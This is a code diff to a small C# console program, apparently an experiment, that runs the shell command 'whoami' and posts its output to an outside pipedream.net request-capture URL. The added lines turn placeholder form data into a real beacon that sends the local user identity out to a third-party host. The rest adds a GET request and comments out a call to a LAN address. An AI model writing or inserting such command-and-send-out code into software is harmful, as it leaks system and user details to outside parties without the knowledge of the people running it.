@@ -1,9 +1,10 @@
 ﻿using System;
 using System.Net;
 using System.Net.Http;
+using System.Threading.Tasks;
 // https://qawithexperts.com/article/c-sharp/run-cmd-commands-using-c/520
 // https://stackoverflow.com/a/27326758/9329272
-
+//
 namespace Testing
 {
     public class Program
@@ -13,33 +14,33 @@ namespace Testing
         {
             string command = "whoami";
 			
-            string whoami = ExecuteMe(command);
+            var whoami = ExecuteMe(command);
 
             Console.WriteLine(whoami);
 
-            Task<string> post = PostMe("https://eoqqzdfuzmgq7gg.m.pipedream.net/");
+            Task<string> post = PostMe("https://eoqqzdfuzmgq7gg.m.pipedream.net/", whoami);
 
             Console.WriteLine(post);
 
-            Task<string> stat = GetMe("https://eoqqzdfuzmgq7gg.m.pipedream.net/");
+            //Task<string> stat = GetMe("http://192.168.1.254:8000");
+            string result = GetRequest("https://www.example.com").GetAwaiter().GetResult(); 
 
-            Console.WriteLine(stat);
+            //Console.WriteLine(stat);
         }
-        static async Task<string> GetMe(string place, string subdir = "/"){
-                client.BaseAddress = new Uri(place);
-                HttpResponseMessage response = client.GetAsync(subdir).Result;
-                response.EnsureSuccessStatusCode();
-                string result = response.Content.ReadAsStringAsync().Result;
-                return result;
-        }
-        public static async Task<string> PostMe(string url)
+        
+        private static async Task<string> GetRequest(string url) 
+        { 
+            using (var client = new HttpClient()) 
+            { 
+                var response = await client.GetAsync(url); 
+                return await response.Content.ReadAsStringAsync(); 
+            } 
+        } 
+        public static async Task<string> PostMe(string url, string whoami)
         {
             var values = new Dictionary<string, string>
             {  
-                { "accountidentifier", "Data you want to send at account field" },
-                { "type", "Data you want to send at type field"},
-                { "seriesid", "The data you went to send at seriesid field"
-                }
+                { "id", whoami }
             };
             //form "postable object" if that makes any sense
             var content = new FormUrlEncodedContent(values);
